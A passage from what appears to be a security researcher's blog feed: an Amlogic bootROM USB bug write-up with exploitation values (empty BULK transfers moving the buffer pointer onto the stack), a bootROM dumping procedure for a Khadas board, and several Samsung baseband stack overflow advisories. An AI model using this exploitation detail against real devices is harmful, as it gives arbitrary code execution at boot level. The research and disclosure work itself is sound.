    &lt;span class="n"&gt;u_int32_t&lt;/span&gt; &lt;span class="n"&gt;addr&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// address where to write payload i.e. 0xfffa0000&lt;/span&gt;
    &lt;span class="n"&gt;u_int32_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// payload size i.e. 0x00010000&lt;/span&gt;
    &lt;span class="n"&gt;u_int32_t&lt;/span&gt; &lt;span class="n"&gt;unk0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// unused&lt;/span&gt;
    &lt;span class="n"&gt;u_int32_t&lt;/span&gt; &lt;span class="n"&gt;unk1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// unused&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;dldata&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Parameters &lt;em&gt;addr&lt;/em&gt; &amp;amp; &lt;em&gt;size&lt;/em&gt; specify where in device memory data should be written. BootROM checks these parameters to ensure that uploaded data will fit into the download buffer [0xfffa0000-0xfffaffff] (0x10000 bytes maximum).&lt;/p&gt;
&lt;p&gt;Then, the payload is uploaded by simply sending &lt;em&gt;wIndex&lt;/em&gt; BULK transfers of size &lt;em&gt;wValue&lt;/em&gt; each.&lt;/p&gt;
&lt;h2&gt;Unfortunate bugs conjunction&lt;/h2&gt;
&lt;p&gt;Although the overall logic of command &lt;strong&gt;AM_REQ_WR_LARGE_MEM&lt;/strong&gt; looks simple and fine, there're still few peculiar details :
size of uploaded data is defined in two different ways:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;dldata.size&lt;/strong&gt; : exact size of uploaded data&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;wValue&lt;/strong&gt; * &lt;strong&gt;wIndex&lt;/strong&gt; : size of each BULK transfer multiplied by the count of BULK transfers&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;While the first one &lt;strong&gt;dldata.size&lt;/strong&gt; is checked, the second one isn't :
size of each BULK transfer &lt;em&gt;wValue&lt;/em&gt; is maxed out at 0x1000, but the &lt;strong&gt;count of BULK transfers &lt;em&gt;wIndex&lt;/em&gt; is not checked&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;As a consequence, an attacker can submit more BULK transfers than required to fill the download buffer.
However, the BULK transfer handler tracks the total size of received data to ensure not exceeding the expected size &lt;strong&gt;dldata.size&lt;/strong&gt;. So an invalid &lt;strong&gt;wIndex&lt;/strong&gt; value is not sufficient to overflow the download buffer.&lt;/p&gt;
&lt;p&gt;Nevertheless, a second bug makes exploitation trivial : after each BULK transfer, &lt;strong&gt;the download buffer pointer (initially set to 0xfffa0000) is incremented by the expected transfer size &lt;em&gt;wValue&lt;/em&gt;, regardless of the actual size of data received&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;So it's time to reuse that empty transfer trick we already used in the Exynos bootROM exploit.
By sending empty BULK transfers, &lt;strong&gt;an attacker can manipulate the download buffer pointer to reach critical bootROM structures&lt;/strong&gt;, like stack memory (below 0xfffe3800).
For example, if the attacker sends 0x43 empty transfers, with &lt;em&gt;wValue&lt;/em&gt; = 0x1000 : (0xfffa0000 + (0x1000 * 0x43) = &lt;strong&gt;0xfffe3000&lt;/strong&gt;, which is stack bottom address.&lt;/p&gt;
&lt;p&gt;Once download buffer pointer has been manipulated, a &lt;strong&gt;last, non-empty BULK transfer is sent to overwrite memory&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Ultimately, these bugs lead to arbitrary code execution at bootROM level, even before the data signature check takes place.&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;USB download feature in Amlogic bootROM only runs signed bootloader images (when Secure Boot is enabled).
However, few bugs in the USB stack allow an attacker with physical access to corrupt bootROM RAM.
Ultimately, an attacker can execute arbitrary code in Secure World, at very early boot stage.&lt;/p&gt;
&lt;p&gt;Despite these bugs, the overall code is quite robust for a BL1-kind software. It implements several hardening techniques :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;time-constant memory compare : to resist timing attacks ?&lt;/li&gt;
&lt;li&gt;complex return codes (i.e. success code is 0xa8df61e7 instead of one or zero) : to resist bit-flip attacks ?&lt;/li&gt;
&lt;li&gt;random execution delays : to resist glitching attacks ?&lt;/li&gt;
&lt;li&gt;mysterious recurrent hash check that immediately reboots if failed : control flow integrity ?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Amlogic bootROM also supports a password protection. This can be used to restrict access to the USB download feature, and thus mitigate this vulnerability.&lt;/p&gt;
&lt;h1&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;2020-10-19 &lt;a href="https://gist.github.com/frederic/0246dde2ecbb8c35f7bb61e98002ceb0"&gt;Bug discovery&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2020-10 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Vulnerability disclosed to Google&lt;/li&gt;
&lt;li&gt;&lt;s&gt;2020-11-05 Google shared the report with Amlogic&lt;/s&gt;&lt;/li&gt;
&lt;li&gt;2020-12 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Password mitigation enabled in factory for new Chromecast devices&lt;/li&gt;
&lt;li&gt;2021-02-08 Password mitigation enabled by software update for Chromecast devices&lt;/li&gt;
&lt;li&gt;2021-02-10 Public disclosure&lt;/li&gt;
&lt;li&gt;2021-02-12 CVE-2021-0467 assigned to this issue&lt;/li&gt;
&lt;li&gt;2021-02-15 Google retracts the date they communicated with Amlogic&lt;/li&gt;
&lt;li&gt;2021-05-01 Vulnerability rated Critical in the &lt;a href="https://source.android.com/security/bulletin/2021-05-01"&gt;Android Security Bulletin—May 2021&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="arm"></category><category term="amlogic"></category><category term="chromecast"></category><category term="bootrom"></category><category term="usb"></category><category term="exploit"></category></entry><entry><title>Dump Amlogic S905D3 BootROM from Khadas VIM3L board</title><link href="https://fredericb.info/2021/02/dump-amlogic-s905d3-bootrom-from-khadas-vim3l-board.html" rel="alternate"></link><published>2021-02-09T00:00:00-08:00</published><updated>2021-02-09T00:00:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2021-02-09:/2021/02/dump-amlogic-s905d3-bootrom-from-khadas-vim3l-board.html</id><summary type="html">&lt;p&gt;This post describes how to dump bootROM from &lt;a href="https://www.amlogic.com/#Products/392/index.html"&gt;Amlogic S905D3 SoC&lt;/a&gt; using &lt;a href="https://www.khadas.com/vim3l"&gt;Khadas VIM3L board&lt;/a&gt;.
Since this board doesn't use Secure Boot, we can execute custom code in Secure World (a.k.a TrustZone) without exploiting any vulnerability.
In addition, the board exposes an UART connector, which is convenient for …&lt;/p&gt;</summary><content type="html">&lt;p&gt;This post describes how to dump bootROM from &lt;a href="https://www.amlogic.com/#Products/392/index.html"&gt;Amlogic S905D3 SoC&lt;/a&gt; using &lt;a href="https://www.khadas.com/vim3l"&gt;Khadas VIM3L board&lt;/a&gt;.
Since this board doesn't use Secure Boot, we can execute custom code in Secure World (a.k.a TrustZone) without exploiting any vulnerability.
In addition, the board exposes an UART connector, which is convenient for communicating with baremetal code running on target.&lt;/p&gt;
&lt;p&gt;&lt;img _="," alt="Collect bootroms" src="https://fredericb.info/blog/exy-bootrom/Collect_bootroms.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
&lt;h1&gt;Ressources&lt;/h1&gt;
&lt;p&gt;&lt;img alt="Khadas VIM3L" src="https://fredericb.info/blog/aml-bootrom/vim3l.png" style="display: block;margin-left: auto;margin-right: auto;"&gt;&lt;/p&gt;
&lt;p&gt;The following resources were abused to complete this project :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.khadas.com/vim3l"&gt;VIM3L board&lt;/a&gt; : SBC based on Amlogic S905D3 System-On-Chip.&lt;/li&gt;
&lt;li&gt;USB to TTL Converter : to enable communication between host and target using UART port.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dl.khadas.com/Hardware/VIM3/Datasheet/S905D3_datasheet_0.2_Wesion.pdf"&gt;S905D3 SoC datasheet&lt;/a&gt; : Khadas published a datasheet for S905D3. It contains a memory map, including the bootROM address.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/khadas/u-boot"&gt;khadas-uboot&lt;/a&gt; : U-Boot code released by Khadas contains a signing tool to package a bootloader image.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/khadas/utils"&gt;khadas-utils&lt;/a&gt; : Khadas released a tool to communicate with the bootROM via USB.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Procedure&lt;/h1&gt;
&lt;p&gt;In order to dump the bootROM, we need to execute custom code in Secure World.&lt;/p&gt;
&lt;p&gt;On most firmwares provided by Khadas, U-Boot shell is accessible via UART port. However, U-Boot runs in Non-Secure World (a.k.a. Normal World) and therefore isn't helpful.&lt;/p&gt;
&lt;p&gt;Instead, we need to execute our code earlier in the boot chain.
Since Secure Boot is disabled on this board, we could modify the &lt;a href="https://github.com/ARM-software/arm-trusted-firmware/blob/master/docs/design/firmware-design.rst"&gt;BL2 bootloader&lt;/a&gt; stored in flash memory.
However, there's a more convienent solution : the bootROM implements a &lt;a href="https://docs.khadas.com/vim3/UpgradeViaUSBCable.html"&gt;feature to load BL2 bootloader via the USB Type-C port&lt;/a&gt;. This in-RAM solution has the advantage of not altering the flash memory.&lt;/p&gt;
&lt;p&gt;Finally, we also take advantage of the UART port to transfer data to our host.&lt;/p&gt;
&lt;h2&gt;Code&lt;/h2&gt;
&lt;p&gt;The code to dump the bootROM is straightforward : each byte is read then sent to UART port.&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://dl.khadas.com/Hardware/VIM3/Datasheet/S905D3_datasheet_0.2_Wesion.pdf"&gt;datasheet published by Khadas&lt;/a&gt; indicates that bootROM memory is at address &lt;strong&gt;[0xFFFF0000-0xFFFFFFFF]&lt;/strong&gt; (region named &lt;em&gt;a53_rom&lt;/em&gt;).
To send data to UART port, we &lt;a href="https://github.com/khadas/u-boot/blob/khadas-vims-pie/arch/arm/cpu/armv8/g12a/firmware/scp_task/uart.c"&gt;reuse open-source code from U-Boot&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Early tests revealed an issue : UART data transfers would stop inconsistently before completion, and the board would then reset.
This issue was caused by a &lt;a href="https://en.wikipedia.org/wiki/Watchdog_timer"&gt;watchdog&lt;/a&gt; timeout. U-Boot source repository contains the code to &lt;a href="https://github.com/khadas/u-boot/blob/khadas-vims-pie/arch/arm/cpu/armv8/g12a/watchdog.c"&gt;reset the watchdog&lt;/a&gt;, which solves that issue.&lt;/p&gt;
&lt;script src="https://gist.github.com/frederic/e080d28a8accf58a779b29cc423b01fa.js"&gt;&lt;/script&gt;

&lt;h2&gt;Build&lt;/h2&gt;
&lt;p&gt;The code is built using GNU C cross-compiler for the arm64 architecture (packages &lt;strong&gt;gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu&lt;/strong&gt; on Debian) :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ aarch64-linux-gnu-gcc -O3 -nostdlib -Wl,--build-id&lt;span class="o"&gt;=&lt;/span&gt;none -o S905D3_dump_bootrom.elf S905D3_dump_bootrom.c
$ aarch64-linux-gnu-objcopy -O binary -j .text S905D3_dump_bootrom.elf S905D3_dump_bootrom.bin
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then, the binary is packaged as regular BL2 image for this target using the &lt;strong&gt;aml_encrypt_g12a&lt;/strong&gt; tool from &lt;a href="https://github.com/khadas/u-boot"&gt;khadas-uboot&lt;/a&gt; repository: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./khadas-uboot/fip/g12a/aml_encrypt_g12a --bl2sig --input ./S905D3_dump_bootrom.bin --output ./S905D3_dump_bootrom.img
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Connect&lt;/h2&gt;
&lt;p&gt;Khadas documentation explains how to &lt;a href="https://docs.khadas.com/vim3/SetupSerialTool.html"&gt;connect UART port&lt;/a&gt; on VIM3L board. On host side, we use &lt;em&gt;minicom&lt;/em&gt; software to communicate with this port :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo minicom -D /dev/ttyUSB0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then, we boot the board in &lt;strong&gt;USB Upgrade mode&lt;/strong&gt; (a.k.a. TST mode or USB Download mode) as &lt;a href="https://docs.khadas.com/vim3/HowtoBootIntoUpgradeMode.html#TST-Mode-Recommended"&gt;explained in Khadas documentation&lt;/a&gt;. In &lt;em&gt;minicom&lt;/em&gt; console, we can see :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SM1:BL:511f6b:81ca2f&lt;span class="p"&gt;;&lt;/span&gt;FEAT:A0F83180:20282000&lt;span class="p"&gt;;&lt;/span&gt;POC:D&lt;span class="p"&gt;;&lt;/span&gt;RCY:0&lt;span class="p"&gt;;&lt;/span&gt;USB:0&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This string ending with &lt;em&gt;USB:0;&lt;/em&gt; means the board has started in USB Upgrade mode.&lt;/p&gt;
&lt;p&gt;On the host side, we see a new USB device :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[10504.840173] usb 1-4.3.1: new high-speed USB device number 16 using xhci_hcd
[10504.979469] usb 1-4.3.1: New USB device found, idVendor=1b8e, idProduct=c003, bcdDevice= 0.20
[10504.979495] usb 1-4.3.1: New USB device strings: Mfr=1, Product=2, SerialNumber=0
[10504.979514] usb 1-4.3.1: Product: GX-CHIP
[10504.979525] usb 1-4.3.1: Manufacturer: Amlogic
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In &lt;em&gt;minicom&lt;/em&gt;, we use the capture feature (CTRL-A L) to save data sent by our program into a file &lt;em&gt;minicom.cap&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Run&lt;/h2&gt;
&lt;p&gt;Our code is uploaded and run on the board using the &lt;strong&gt;update&lt;/strong&gt; tool from &lt;a href="https://github.com/khadas/utils"&gt;khadas-utils&lt;/a&gt; repository.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./khadas-utils/aml-flash-tool/tools/linux-x86/update write ./S905D3_dump_bootrom.img 0xfffa0000
..
Transfer Complete! total size is &lt;span class="m"&gt;65536&lt;/span&gt; Bytes

$ ./khadas-utils/aml-flash-tool/tools/linux-x86/update run 0xfffa0000
&lt;span class="o"&gt;[&lt;/span&gt;update&lt;span class="o"&gt;]&lt;/span&gt;Run at Addr fffa0000
AmlUsbRunBinCode:ram_addr&lt;span class="o"&gt;=&lt;/span&gt;fffa0000
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In &lt;em&gt;minicom&lt;/em&gt; console, we received the bootROM dump sent by our code :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;e0031faae1031faae2031faae3031faae4031faae5031faae6031faae7031faae8031fa
ae9031faaea031faaeb031faaec031faaed031faaee031faaef031faaf0031faaf1031f
aaf2031faaf3031faaf4031faaf5031faaf6031faaf7031faaf8031faaf9031faafa031
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since the dump is encoded in hexadecimal representation, the last step is to convert it back to binary :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat minicom.cap &lt;span class="p"&gt;|&lt;/span&gt; xxd -r -p &amp;gt; VIM3L.bootrom.bin

$ sha1sum VIM3L.bootrom.bin
5de02d2958d4d7214b28521239ec9b63fe9a2dbe  VIM3L.bootrom.bin

$ wc -c VIM3L.bootrom.bin
&lt;span class="m"&gt;65536&lt;/span&gt;   VIM3L.bootrom.bin

$ strings -13 VIM3L.bootrom.bin
auth failed, reboot...
511f6b60cfd40c6
ken.amlogic.com
&lt;span class="m"&gt;03&lt;/span&gt;/26/19_12:20:42
gcc version &lt;span class="m"&gt;4&lt;/span&gt;.8
511f6b60cfd40c6
INDXCHIPOPS_ROMVfb_e1
FAILkey error
FAILkey len error
FAILmissing var
max-download-size
FAILmissing var!
FAILUnkonw chipinfo id
FAILVariable not implemented
FAILdata invalid size
FAILdata too large
FAILkey_len error
FAILunknow &lt;span class="nb"&gt;command&lt;/span&gt;
New World Cup
usb_dnl_fastboot
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The strings in the bootROM dump reveal that Fastboot protocol is implemented (different protocol than the one we just used to upload our code).&lt;/p&gt;</content><category term="arm"></category><category term="amlogic"></category><category term="bootloader"></category><category term="bootrom"></category><category term="khadas"></category><category term="vim3l"></category></entry><entry><title>SVE-2019-13963 : Remote stack overflow in Samsung baseband caused by malformed IMMEDIATE ASSIGNMENT message</title><link href="https://fredericb.info/2020/12/sve-2019-13963-remote-stack-overflow-in-samsung-baseband-caused-by-malformed-immediate-assignment-message.html" rel="alternate"></link><published>2020-12-07T00:00:00-07:00</published><updated>2020-12-07T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2020-12-07:/2020/12/sve-2019-13963-remote-stack-overflow-in-samsung-baseband-caused-by-malformed-immediate-assignment-message.html</id><summary type="html">&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;When Samsung Shannon baseband receives message IMMEDIATE ASSIGNMENT (9.1.18 in &lt;a href="https://www.etsi.org/deliver/etsi_gts/04/0408/05.03.00_60/gsmts_0408v050300p.pdf"&gt;GSM/04.08&lt;/a&gt;) from network, the length of the Mobile Allocation IE (GSM/04.08 10.5.2.21) is not properly checked.&lt;/p&gt;
&lt;p&gt;&lt;img alt="GSM/04.08 IMMEDIATE ASSIGNMENT message" src="https://fredericb.info/blog/SVE-2019-13963/gsm_imm-assign.png" width="700px"&gt;&lt;/p&gt;
&lt;p&gt;Mobile allocation data is directly copied to a buffer on the stack without checking …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;When Samsung Shannon baseband receives message IMMEDIATE ASSIGNMENT (9.1.18 in &lt;a href="https://www.etsi.org/deliver/etsi_gts/04/0408/05.03.00_60/gsmts_0408v050300p.pdf"&gt;GSM/04.08&lt;/a&gt;) from network, the length of the Mobile Allocation IE (GSM/04.08 10.5.2.21) is not properly checked.&lt;/p&gt;
&lt;p&gt;&lt;img alt="GSM/04.08 IMMEDIATE ASSIGNMENT message" src="https://fredericb.info/blog/SVE-2019-13963/gsm_imm-assign.png" width="700px"&gt;&lt;/p&gt;
&lt;p&gt;Mobile allocation data is directly copied to a buffer on the stack without checking its size. This stack overflow can lead to remote arbitrary code execution in the Shannon modem.&lt;/p&gt;
&lt;h1&gt;CVSS Version 3 Metrics&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Attack Vector (AV): Adjacent (A)&lt;/li&gt;
&lt;li&gt;Attack Complexity (AC): Low (L)&lt;/li&gt;
&lt;li&gt;Privileges Required (PR): None (N)&lt;/li&gt;
&lt;li&gt;User Interaction (UI): None (N)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"&gt;Overall CVSS Score: 8.8&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Affected Versions&lt;/h1&gt;
&lt;p&gt;Samsung smartphones based on Android N(7.x), O(8.x), Go(8.1), P(9.0), Go(9.0) with Exynos chipsets.&lt;/p&gt;
&lt;h1&gt;Solution&lt;/h1&gt;
&lt;p&gt;Samsung security update of April 2019 fixes this vulnerability.&lt;/p&gt;
&lt;h1&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;2019-02-05 Privately reported to Samsung&lt;/li&gt;
&lt;li&gt;2019-04-02 Bug fixed in Samsung Bulletin &lt;a href="https://security.samsungmobile.com/securityUpdate.smsb"&gt;SMR-APR-2019&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="samsung"></category><category term="shannon"></category><category term="baseband"></category><category term="security"></category><category term="arm"></category></entry><entry><title>Remote stack overflow in Samsung baseband caused by malformed GMM ATTACH ACCEPT message</title><link href="https://fredericb.info/2020/11/remote-stack-overflow-in-samsung-baseband-caused-by-malformed-gmm-attach-accept-message.html" rel="alternate"></link><published>2020-11-30T00:00:00-07:00</published><updated>2020-11-30T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2020-11-30:/2020/11/remote-stack-overflow-in-samsung-baseband-caused-by-malformed-gmm-attach-accept-message.html</id><summary type="html">&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;When Samsung Shannon baseband receives message GMM ATTACH ACCEPT (9.4.2 in &lt;a href="https://www.etsi.org/deliver/etsi_ts/124000_124099/124008/14.04.00_60/ts_124008v140400p.pdf"&gt;TS 24.008&lt;/a&gt;) from network,
the minimum length for MS Identity IE (10.5.1.4) is not properly checked.&lt;/p&gt;
&lt;p&gt;&lt;img alt="TS 24.008 GMM ATTACH ACCEPT message" src="https://fredericb.info/blog/Shannon_MS_ID/gmm_attach_accept.png" width="700px"&gt;&lt;/p&gt;
&lt;p&gt;MS Identity (IEI 0x23) length is decremented without prior check. If this value is zero, a …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;When Samsung Shannon baseband receives message GMM ATTACH ACCEPT (9.4.2 in &lt;a href="https://www.etsi.org/deliver/etsi_ts/124000_124099/124008/14.04.00_60/ts_124008v140400p.pdf"&gt;TS 24.008&lt;/a&gt;) from network,
the minimum length for MS Identity IE (10.5.1.4) is not properly checked.&lt;/p&gt;
&lt;p&gt;&lt;img alt="TS 24.008 GMM ATTACH ACCEPT message" src="https://fredericb.info/blog/Shannon_MS_ID/gmm_attach_accept.png" width="700px"&gt;&lt;/p&gt;
&lt;p&gt;MS Identity (IEI 0x23) length is decremented without prior check. If this value is zero, a short integer underflow occurs. This invalid size is then used to copy received MS Identity data to a stack buffer. This stack overflow can lead to remote arbitrary code execution in the Shannon modem.&lt;/p&gt;
&lt;h1&gt;CVSS Version 3 Metrics&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Attack Vector (AV): Adjacent (A)&lt;/li&gt;
&lt;li&gt;Attack Complexity (AC): Low (L)&lt;/li&gt;
&lt;li&gt;Privileges Required (PR): None (N)&lt;/li&gt;
&lt;li&gt;User Interaction (UI): None (N)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"&gt;Overall CVSS Score: 8.8&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Affected Versions&lt;/h1&gt;
&lt;p&gt;Discovered in Shannon baseband of Galaxy S8 (SM-G950FD), it may affect other models based on Exynos chipsets.&lt;/p&gt;
&lt;h1&gt;Solution&lt;/h1&gt;
&lt;p&gt;Samsung security update of December 2018 fixes this vulnerability.&lt;/p&gt;
&lt;h1&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;2018-12-04 Bug fixed in Samsung security update &lt;a href="https://security.samsungmobile.com/securityUpdate.smsb"&gt;SMR-DEC-2018&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2019-05-25 Bug discovered in old firmware&lt;/li&gt;
&lt;li&gt;2019-05-28 Bug fix discovered in latest firmware&lt;/li&gt;
&lt;li&gt;2019-05-28 Bug hunting procedures reconsidered&lt;/li&gt;
&lt;/ul&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="samsung"></category><category term="shannon"></category><category term="baseband"></category><category term="security"></category><category term="arm"></category></entry><entry><title>Remote stack overflow in Samsung baseband caused by malformed P-TMSI REALLOCATION COMMAND</title><link href="https://fredericb.info/2020/11/remote-stack-overflow-in-samsung-baseband-caused-by-malformed-p-tmsi-reallocation-command.html" rel="alternate"></link><published>2020-11-23T00:00:00-07:00</published><updated>2020-11-23T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2020-11-23:/2020/11/remote-stack-overflow-in-samsung-baseband-caused-by-malformed-p-tmsi-reallocation-command.html</id><summary type="html">&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;When Samsung Shannon baseband receives message P-TMSI REALLOCATION COMMAND (9.4.7 in &lt;a href="https://www.etsi.org/deliver/etsi_ts/124000_124099/124008/13.07.00_60/ts_124008v130700p.pdf"&gt;TS 24.008&lt;/a&gt;) from network,
the length of the Mobile Identity IE (10.5.1.4) is not properly checked.&lt;/p&gt;
&lt;p&gt;&lt;img alt="TS 24.008 P-TMSI REALLOCATION COMMAND message" src="https://fredericb.info/blog/PTMSI/TS24.008_PTMSI-realloc-cmd.png" width="700px"&gt;&lt;/p&gt;
&lt;p&gt;Mobile identity data is directly copied to a stack buffer without prior size check. This stack …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;When Samsung Shannon baseband receives message P-TMSI REALLOCATION COMMAND (9.4.7 in &lt;a href="https://www.etsi.org/deliver/etsi_ts/124000_124099/124008/13.07.00_60/ts_124008v130700p.pdf"&gt;TS 24.008&lt;/a&gt;) from network,
the length of the Mobile Identity IE (10.5.1.4) is not properly checked.&lt;/p&gt;
&lt;p&gt;&lt;img alt="TS 24.008 P-TMSI REALLOCATION COMMAND message" src="https://fredericb.info/blog/PTMSI/TS24.008_PTMSI-realloc-cmd.png" width="700px"&gt;&lt;/p&gt;
&lt;p&gt;Mobile identity data is directly copied to a stack buffer without prior size check. This stack overflow can lead to remote code execution in the Shannon modem.&lt;/p&gt;
&lt;h1&gt;CVSS Version 3 Metrics&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Attack Vector (AV): Adjacent (A)&lt;/li&gt;
&lt;li&gt;Attack Complexity (AC): Low (L)&lt;/li&gt;
&lt;li&gt;Privileges Required (PR): None (N)&lt;/li&gt;
&lt;li&gt;User Interaction (UI): None (N)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"&gt;Overall CVSS Score: 8.8&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Affected Versions&lt;/h1&gt;
&lt;p&gt;Discovered in Shannon baseband of Galaxy S8 (SM-G950FD), it may affect other models based on Exynos chipsets.&lt;/p&gt;
&lt;h1&gt;Solution&lt;/h1&gt;
&lt;p&gt;Samsung security update of December 2018 fixes this vulnerability.&lt;/p&gt;
&lt;h1&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;2018-11-19 Working proof-of-concept&lt;/li&gt;
&lt;li&gt;2018-12-04 Bug fixed in Samsung security update &lt;a href="https://security.samsungmobile.com/securityUpdate.smsb"&gt;SMR-DEC-2018&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2018-12-05 Reconsider life choices&lt;/li&gt;
&lt;/ul&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="samsung"></category><category term="shannon"></category><category term="baseband"></category><category term="security"></category><category term="arm"></category></entry><entry><title>exynos-usbdl : unsigned code loader for Exynos BootROM</title><link href="https://fredericb.info/2020/06/exynos-usbdl-unsigned-code-loader-for-exynos-bootrom.html" rel="alternate"></link><published>2020-06-17T00:00:00-07:00</published><updated>2020-06-17T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2020-06-17:/2020/06/exynos-usbdl-unsigned-code-loader-for-exynos-bootrom.html</id><summary type="html">&lt;p&gt;In previous posts, we explained how to &lt;a href="https://fredericb.info/2020/06/exynos8890-bootrom-dump-dump-exynos-8890-bootrom-from-samsung-galaxy-s7.html"&gt;dump Exynos bootROM&lt;/a&gt; and &lt;a href="https://fredericb.info/2020/06/reverse-engineer-usb-stack-of-exynos-bootrom.html"&gt;reverse its USB stack&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;These efforts led to the discovery of a bug in the USB stack that can be exploited to run arbitrary code.&lt;/p&gt;
&lt;p&gt;The following chipsets are known to be affected by this bug :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Exynos 8890&lt;/li&gt;
&lt;li&gt;Exynos …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;In previous posts, we explained how to &lt;a href="https://fredericb.info/2020/06/exynos8890-bootrom-dump-dump-exynos-8890-bootrom-from-samsung-galaxy-s7.html"&gt;dump Exynos bootROM&lt;/a&gt; and &lt;a href="https://fredericb.info/2020/06/reverse-engineer-usb-stack-of-exynos-bootrom.html"&gt;reverse its USB stack&lt;/a&gt;.&lt;/p&gt;
